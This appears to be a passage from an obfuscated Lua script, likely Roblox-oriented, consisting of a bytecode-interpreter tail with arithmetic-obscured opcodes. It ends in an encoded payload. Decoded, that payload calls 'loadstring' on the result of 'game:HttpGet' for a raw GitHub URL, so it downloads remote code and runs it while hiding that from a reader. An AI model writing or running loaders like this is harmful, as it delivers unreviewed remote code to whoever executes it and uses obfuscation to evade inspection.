v113;v76[v78[(414 -(15 + 398)) + 1 ]]={};v70=v70 + 1 ;v78=v66[v70];v76[v78[4 -2 ]]=v60[v78[11 -8 ]];v70=v70 + (1825 -(1195 + 629)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v60[v78[3 -0 ]];v70=v70 + (242 -((479 -292) + 54)) ;v78=v66[v70];v113=v78[782 -(162 + 618) ];v112=v76[v78[3 + (1551 -(1126 + 425)) ]];v76[v113 + 1 + 0 ]=v112;v76[v113]=v112[v78[8 -4 ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[1 + 1 ]]=v78[1639 -(1373 + 263) ];v70=v70 + (1146 -(466 + 679)) ;v78=v66[v70];v113=v78[4 -2 ];v110,v111=v69(v76[v113](v13(v76,v113 + 1 ,v78[8 -5 ])));v71=(v111 + v113) -(1001 -(451 + 549)) ;v109=(982 -(18 + 964)) + 0 ;for v135=v113,v71 do local v136=0 -0 ;while true do if (v136==(0 -0)) then v109=v109 + ((5213 -3828) -((1151 -(118 + 287)) + 638)) ;v76[v135]=v110[v109];break;end end end v70=v70 + 1 + 0 ;v78=v66[v70];v113=v78[2];v76[v113]=v76[v113](v13(v76,v113 + (585 -(57 + 527)) ,v71));v70=v70 + ((827 + 601) -(41 + 1386)) ;v78=v66[v70];v76[v78[2]]();v70=v70 + (1 -0) ;v78=v66[v70];do return;end else v76[v78[343 -(218 + 78 + 45) ]]();end elseif (v79<=(1587 -(1535 + 46))) then local v128=(1121 -(118 + 1003)) -(850 -(20 + 830)) ;local v129;while true do if (v128==(0 + 0)) then v129=v78[1 + 1 ];v76[v129]=v76[v129](v13(v76,v129 + ((2 -1) -0) ,v71));break;end end elseif ((v79==(22 -(392 -(142 + 235)))) or (1869==2009)) then local v142=v78[2];local v143,v144=v69(v76[v142](v13(v76,v142 + (561 -(306 + 254)) ,v78[1 + (9 -7) ])));v71=(v144 + v142) -(1 + 0 + 0) ;local v145=0 -0 ;for v154=v142,v71 do v145=v145 + ((1146 + 322) -(899 + 568)) ;v76[v154]=v143[v145];end else v76[v78[(979 -(553 + 424)) + 0 ]]={};end v70=v70 + (2 -1) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403413Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F48657869746F706978656C2F542F726566732F68656164732F6D61696E2F5400094Q00057Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
